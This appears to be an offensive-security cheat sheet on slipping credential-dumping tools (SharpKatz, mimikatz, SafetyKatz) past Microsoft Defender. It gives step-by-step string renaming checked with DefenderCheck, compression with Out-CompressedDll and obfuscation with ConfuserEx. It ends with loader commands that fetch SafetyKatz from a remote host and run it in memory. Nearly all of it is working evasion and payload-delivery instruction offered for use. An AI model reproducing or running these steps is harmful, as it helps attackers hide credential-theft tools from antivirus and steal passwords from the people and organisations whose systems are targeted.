**DefenderCheck:** https://github.com/matterpreter/DefenderCheck
```
DefenderCheck.exe <Path to Sharpkatz binary>
```
1. Open the project in Visual Studio
2. Press *CTRL + H*
3. Find and replace the string "Credentials" with "Credents"
4. Select the scope as *Entire Solution*
5. Press *Replace All* button
6. Build and recheck the binary with *DefenderCheck*
7. Repeat above steps if still there is detection

**String Manipulation:**
```
Out-CompressedDll <Path to mimikatz.exe> outputfilename.txt
```

**Obfuscation:**
	**ConfuserEx:** https://github.com/mkaring/ConfuserEx
		**Launch ConfuserEx:**
		1. In Project tab select the Base Directory where the binary file is located
		2. In Project tab select the Binary File that we want to obfuscate
		3. In Settings tab add the rules
		4. In Settings tab edit the rule and select the preset as 'Normal'
		5. In Protect tab click on the protect button

**Payload Delivery:**
	**NetLoader:** https://github.com/Flangvik/NetLoader
	**AssemblyLoad:** https://github.com/alexporcar/AD-hack-tools/tree/master
```
Loader.exe -path http://192.168.100.10/SafetyKatz.exe

AssemblyLoad.exe http://192.168.100.10/Loader.exe -path http://192.168.100.10/SafetyKatz.exe
```
